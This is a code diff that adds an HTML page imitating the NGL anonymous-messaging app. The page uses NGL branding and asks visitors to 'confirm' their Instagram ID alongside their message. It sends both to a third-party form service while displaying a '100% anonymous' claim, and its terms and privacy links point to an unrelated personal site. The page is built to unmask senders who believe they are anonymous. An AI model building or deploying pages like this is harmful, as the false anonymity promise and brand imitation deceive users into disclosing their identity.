@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NGL App</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/x-icon" href="resources/ngl.ico">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+        </div>
+        <div class="content">
+            <div class="top-content">
+                <img src="resources/download.png" alt="NGL Logo" class="logo">
+                <p style="text-align: center;">Get anonymous messages on<br>Instagram!</p>
+                <form id="ngl-form" action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="REPLACE-WITH-YOUR-API-KEY">
+                    <div class="message-box">
+                        <textarea id="user-input" name="instagram_id" placeholder="Confirm Your Insagram ID"
+                            required style="font-family:lucida sans;"></textarea>
+                    </div>
+                    <button type="button" id="randomizer">
+                        <img src="resources/die.png" alt="randomizer">
+                    </button>
+                    <div class="message-box">
+                        <textarea id="message-input" name="message" placeholder="send me anonymous messages!"
+                            required style="font-family: verdana;"></textarea>
+                    </div>
+                    <p class="anonymous"><img src="resources/lock.png" alt="Lock Icon"> 100% anonymous</p>
+                    <button type="submit" id="send-message"><b>Send!</b></button>
+                </form>
+                <p class="people-tapped"><img src="resources/down.png" alt="Down Arrow"> <span id="people-count"></span>
+                    people just tapped the button <img src="resources/down.png" alt="Down Arrow"></p>
+                <button id="animated-button"><b>Get Your Own Messages!</button>
+            </div>
+        </div>
+        <div class="footer">
+            <p style="font-family: blinkmacsystemfont; font-size: 15px;">By continuing, you agree to our <a href="http://alansweb.website2.me" target="_blank">Terms of Use</a>
+                and have read and agreed to our <a href="http://alansweb.website2.me" target="_blank">Privacy
+                    Policy</a>.</p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+</html>
